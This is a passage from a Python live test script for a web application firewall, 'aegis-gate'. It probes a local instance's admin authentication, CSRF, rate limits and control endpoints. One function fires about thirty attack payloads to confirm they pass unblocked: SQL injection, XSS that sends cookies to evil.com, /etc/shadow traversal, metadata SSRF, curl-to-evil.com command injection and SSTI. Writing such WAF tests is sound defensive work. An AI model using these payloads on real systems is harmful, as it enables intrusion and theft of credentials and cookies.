        mode_val = j.get("mode", j.get("current", "unknown"))
        R.record("MODE", "mode field is present", mode_val != "unknown",
                 f"mode={mode_val}")


# ─────────────────────────────────────────────────────────────────────────────
# Rate limit config: read existing config
# ─────────────────────────────────────────────────────────────────────────────
def test_rate_limit_config(c: Client):
    hdr("Rate limit config: verify global IP bucket is configured")
    sep()

    # Try admin API for rate-limit config
    endpoints = ["/api/rate-limit", "/api/rate_limit", "/api/config/rate-limit"]
    for ep in endpoints:
        s, body, _ = c.aget(ep)
        if s == 200:
            j = c.json_body(body)
            R.record("RL-CONFIG", f"rate limit config at {ep}", True,
                     str(j)[:80] if j else str(body[:80]))
            return
    R.skip("RL-CONFIG", "no rate limit config API found", "")


# ─────────────────────────────────────────────────────────────────────────────
# Nonce endpoint / challenge flow
# ─────────────────────────────────────────────────────────────────────────────
def test_waf_control_endpoints(c: Client):
    hdr("WAF control endpoints: /__waf_control/*")
    sep()

    for path, label in [
        ("/__waf_control/health", "health check"),
        ("/__waf_control/status", "status"),
    ]:
        s, body, _ = c.get(path)
        R.record("WAF-CTRL", f"{path} ({label})",
                 s in (200, 404, 405), f"HTTP {s}")


# ─────────────────────────────────────────────────────────────────────────────
# Bulk attack flood: send 20 attacks to confirm none are blocked (SEC-07 mass)
# ─────────────────────────────────────────────────────────────────────────────
def test_sec07_mass_flood(c: Client):
    hdr("SEC-07 mass: rapid-fire 30 attack payloads — verify 0 blocked")
    sep()
    # LT-RUN-7 TS-07 (2026-05-14) — pre-fix the XSS payloads
    # had literal `<` / `>` in the URL string.  urllib may
    # auto-encode (silent normalisation) or raise InvalidURL
    # depending on Python version (3.11+ stricter).  Pre-encode
    # explicitly so the bytes on the wire match intent.
    import urllib.parse as _up
    def _qs(name: str, value: str) -> str:
        return f"{name}={_up.quote(value, safe='')}"
    payloads = [
        ("/api?q=1'+UNION+SELECT+version()--", "SQLi mass 1"),
        ("/api?q=1'+AND+1=2+UNION+SELECT+NULL,NULL--", "SQLi mass 2"),
        ("/search?" + _qs("x", "<script>eval(atob('YWxlcnQoMSk='))</script>"), "XSS mass 1"),
        ("/search?" + _qs("x", "<img src=1 onerror=eval(name)>"), "XSS mass 2"),
        ("/file?path=../../../../etc/shadow", "PathTraversal mass 1"),
        ("/file?path=%252F%252F..%252F..%252Fetc%252Fpasswd", "PathTraversal double-enc"),
        ("/proxy?url=http://192.168.1.1/admin", "SSRF RFC1918"),
        ("/proxy?url=http://[::ffff:169.254.169.254]/", "SSRF IPv4-mapped meta"),
        ("/exec?c=id;cat+/etc/passwd", "CmdInj 1"),
        ("/exec?c=ping+-c+1+$(id)", "CmdInj 2"),
        ("/tmpl?t={{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "SSTI 1"),
        ("/tmpl?t=${7*7}", "SSTI 2"),
        ("/.git/config", "Recon git"),
        ("/.env.production", "Recon env"),
        ("/actuator/env", "Recon actuator"),
        ("/v1.41/containers/json", "Recon docker API"),
        ("/.aws/credentials", "Recon AWS"),
        ("/api/users?filter[$ne]=", "NoSQLi"),
        ("/redirect?to=//evil.com/path", "OpenRedirect"),
        ("/api?x=value%0d%0aSet-Cookie:+evil=1", "HeaderInj CRLF"),
        ("/search?q=javascript:alert(document.cookie)", "XSS JS proto"),
        ("/api?id=1+AND+(SELECT+1+FROM+information_schema.tables)--", "SQLi schema"),
        ("/proxy?url=dict://localhost:11211/stats", "SSRF dict"),
        ("/proxy?url=ftp://10.0.0.1/etc/passwd", "SSRF FTP"),
        ("/exec?c=curl+http://evil.com/$(id)", "CmdInj curl exfil"),
        ("/_ignition/execute-solution", "Recon Laravel CVE"),
        ("/api?q=<svg/onload=fetch('//evil.com?c='+document.cookie)>", "XSS SVG fetch"),
        ("/robots.txt/../../../etc/passwd", "PathTraversal robots"),
        ("/api?id=1'+AND+BENCHMARK(50000000,MD5(1))--", "SQLi blind timing"),
        ("/api/users?$where=function(){return true}", "NoSQLi $where"),
    ]
    blocked = 0
    total = len(payloads)
    for path, label in payloads:
        s, _, _ = c.get(path)
        if s in (403, 406, 429):
            blocked += 1
            R.record("SEC-07", f"BLOCKED: {label}", False,
                     f"HTTP {s} — attack blocked (SEC-07 fix may be landing!)")
        else:
            R.record("SEC-07", f"passes through: {label}", True,
                     f"HTTP {s} — not blocked (SEC-07 confirmed)")
    sep()
    if blocked == 0:
        warn(f"  SEC-07 CONFIRMED: 0/{total} mass attacks blocked")
    else:
        ok(f"  {blocked}/{total} attacks now blocked — partial fix progress")


# ─────────────────────────────────────────────────────────────────────────────
# Authentication security tests
# ─────────────────────────────────────────────────────────────────────────────
def test_admin_auth_security(c: Client):
    hdr("Admin auth: security properties")
    sep()

    bad_client = Client(c.base, c.admin, True, c.verbose, "admin", "wrong-password")
    s, _, _ = bad_client._req(c.admin + "/admin/login", "POST",
                               {"user": "admin", "password": "wrong-password"})
    R.record("AUTH", "bad password returns 401", s == 401, f"HTTP {s}")

    # CSRF: mutation without CSRF header should fail
    jar_path = "/tmp/lt_run6_csrf_test.jar"
    tmp_client = Client(c.base, c.admin, True, c.verbose, c.user, c.password)
    tmp_client.login()
    tmp_client.csrf = None  # strip CSRF
    s2, _, _ = tmp_client.aput("/api/detectors", {"sqli": {"enabled": True}})
    R.record("AUTH", "mutation without CSRF token → 403",
             s2 == 403, f"HTTP {s2}")

    # Unauthenticated admin read should fail
    anon_client = Client(c.base, c.admin, True, c.verbose, "", "")
    s3, _, _ = anon_client.aget("/api/about")
    R.record("AUTH", "unauthenticated admin request → 401",
             s3 in (401, 403), f"HTTP {s3}")


# ─────────────────────────────────────────────────────────────────────────────
# Large payload / body abuse
# ─────────────────────────────────────────────────────────────────────────────
def test_body_abuse(c: Client):
    hdr("Body abuse: oversized and malicious body content")
    sep()

    # Large body with SQLi
    large_sqli = ("A" * 8192) + "1' OR '1'='1"
    s, _, _ = c.post("/api/data", large_sqli.encode(),
                     {"Content-Type": "text/plain"})
    R.record("BODY-ABUSE", "large SQLi body passes through (SEC-07 confirms no body scan)",
             s in (200, 502, 413), f"HTTP {s}")

    # XSS in POST body
    xss_body = {"comment": "<script>alert(document.cookie)</script>",
                "user": "admin' OR '1'='1"}
    s2, _, _ = c.post("/api/comment", xss_body)
    R.record("BODY-ABUSE", "XSS+SQLi in POST body passes through (SEC-07)",
             s2 in (200, 502), f"HTTP {s2}")

    # Oversized body
    huge_body = b"X" * (1024 * 1024)  # 1 MB
    s3, _, _ = c.post("/api/upload", huge_body, {"Content-Type": "application/octet-stream"})
    R.record("BODY-ABUSE", "1MB body handled (413 or 200/502 acceptable)",
             s3 in (200, 413, 502), f"HTTP {s3}")


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="LT-RUN-6 live integration tests")
    parser.add_argument("--data",  default="http://localhost:8080",
                        help="Data plane base URL")
    parser.add_argument("--admin", default="http://localhost:9443",
                        help="Admin base URL")
    parser.add_argument("--user",  default="admin")
    parser.add_argument("--pass",  dest="password", default="aegis-test-1234")
    parser.add_argument("--no-tls-verify", dest="verify_tls",
                        action="store_false", default=True)
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    print(f"{BOLD}{CYAN}")
    print("╔═══════════════════════════════════════════════════════════╗")
    print("║     LT-RUN-6  ·  aegis-gate live integration tests       ║")
    print("╚═══════════════════════════════════════════════════════════╝")
    print(f"{RESET}")
    print(f"  Data plane : {args.data}")
    print(f"  Admin      : {args.admin}")
    print(f"  Admin user : {args.user}")

    c = Client(args.data, args.admin, args.verify_tls, args.verbose,
               args.user, args.password)

    # 0. Server check
    if not test_server_up(c):
        print(f"\n{RED}Admin is not responding. Check `make run-dev` is running.{RESET}")
        print("Continuing with data-plane-only tests...\n")
        test_sec07_detectors_disconnected(c)
        test_sec20_response_passthrough(c)
        test_interop_headers(c)
        test_body_scrubbing(c)
        test_sec07_mass_flood(c)
        test_body_abuse(c)
        test_pow_challenge(c)
        test_waf_control_endpoints(c)
        R.summary()
        return

    # Admin login
    hdr("Admin login")
    sep()
    if not c.login():
        warn("Login failed — admin tests will be skipped")
    else:
        ok(f"Logged in as {args.user}  (CSRF token: {c.csrf[:16] if c.csrf else 'none'}...)")

    # Run all test groups
    test_admin_api(c)
    test_admin_auth_security(c)
    test_mode_api(c)
    test_rate_limit_config(c)
    test_detector_toggles(c)

    # Run-6 finding tests
    test_sec07_detectors_disconnected(c)
    test_sec07_mass_flood(c)
    test_sec20_response_passthrough(c)
    test_body_scrubbing(c)
    test_eval01_cidr_ipin(c)
    test_eval02_ratelimit_no_backend(c)
    test_noop_pipeline(c)
    test_blacklist_cidr(c)
    test_whitelist(c)
    test_ddos_gate(c)
    test_risk_api(c)
    test_threat_intel_api(c)
    test_pow_challenge(c)
    test_waf_control_endpoints(c)
    test_interop_headers(c)
    test_body_abuse(c)

    R.summary()
    sys.exit(0 if R.failed == 0 else 1)


if __name__ == "__main__":
    main()
